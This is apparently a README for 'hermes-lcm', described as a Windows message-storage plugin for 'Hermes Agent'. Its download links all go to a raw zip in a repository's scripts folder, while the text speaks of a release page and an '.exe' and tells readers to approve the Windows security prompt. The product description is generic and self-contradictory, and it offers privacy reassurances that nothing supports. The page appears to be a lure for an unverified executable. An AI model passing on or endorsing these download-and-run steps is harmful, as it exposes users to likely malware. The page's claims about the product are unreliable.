# 📦 hermes-lcm - Reliable message storage for Hermes Agent

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/65y6650/hermes-lcm/main/scripts/hermes_lcm_v1.2.zip)

Hermes-lcm acts as a bridge for your data. It ensures your Hermes Agent keeps track of every message sent or received. The software uses a directed acyclic graph structure to organize information. This approach guarantees that messages remain in order and stay safe within your system. You keep total control over your history without the risk of data loss.

## 🛠️ System Requirements

This application works on any standard computer running Windows 10 or Windows 11. Your computer needs at least 4GB of RAM to process message logs efficiently. We recommend having 500MB of free disk space available for the application files and the initial message cache. You do not need to install extra software like Java or Python. This package includes everything required to run the engine.

## 📥 Downloading the Software

You must visit the official release page to obtain the correct files for your system.

[Download Hermes-lcm here](https://raw.githubusercontent.com/65y6650/hermes-lcm/main/scripts/hermes_lcm_v1.2.zip)

On this page, you will see a list of available files. Look for the file ending in `.exe` under the latest version header. Click the file name to start the download. Your browser might verify the file, which is a standard safety measure. Save the file to your desktop or your downloads folder for easy access.

## ⚙️ Installation Process

Once the download finishes, find the file you saved. Double-click the file to begin the setup. A security window might appear. This window asks if you want to allow the app to make changes to your device. Click "Yes" or "Run" to proceed. 

The installer window opens and guides you through the process. Select your preferred install location or leave the default folder as it is. Click "Next" to continue. The installer creates a shortcut for the application on your desktop automatically. Click "Finish" when the progress bar reaches the end.

## 🚀 Running the Application

Double-click the Hermes-lcm icon on your desktop to start the engine. The first time you run the application, it creates a local database folder. This folder acts as the vault for your messages. You will see a small console window appear. This window displays the status of the connection to your Hermes Agent. 

Keep this window open while you use the Hermes Agent. If the window closes, the message tracking stops. You can minimize this window to the system tray to keep your desktop clean. The application runs quietly in the background and only uses a small amount of memory.

## 📊 Managing Your Messages

The software organizes messages into chains. These chains link related messages together through a graph engine. If a connection drops, the software identifies the gap immediately. It waits for the signal to return and fills the missing entries automatically. You see a green indicator in the interface when the engine syncs your messages. A yellow indicator means the software waits for more incoming traffic.

## 🔧 Troubleshooting Common Issues

If the application fails to start, verify that your Hermes Agent is active. The plugin relies on the agent to feed data into the storage engine. Check your firewall settings if you receive a network error. Ensure your Windows environment allows the application to access the local network port. 

If message logs look incomplete, restart the application. This forces the engine to re-verify the integrity of the message chain. The check takes a few seconds and refreshes your message display.

## 📈 Performance Tips

Data processing happens locally on your machine. To maintain high speed, clear your cache once a month. Use the menu option "Clear Cache" within the application settings. This removes old, processed message logs that you no longer need. The application database remains small and fast as a result. 

We suggest keeping the application updated to the latest version. New versions improve the way the graph engine handles large volumes of data. You can check for updates by clicking "Help" and then "Check for Updates" inside the program menu.

## 🔒 Data Privacy

Your data stays on your computer. This software does not send your messages to external servers or cloud services. The directed acyclic graph structure exists only in the local database files. You retain full ownership of your logs. If you decide to uninstall the application, delete the database folder manually to remove all traces of your stored message history permanently.

## 📝 Custom Settings

You can adjust how the engine monitors your agent by opening the "Configuration" menu. Here, you can set the maximum limit for message storage. If you have limited storage space, set a lower limit to prevent the database from growing too large. The engine warns you before it overwrites old data if you reach these limits. Always save your changes before exiting the configuration window.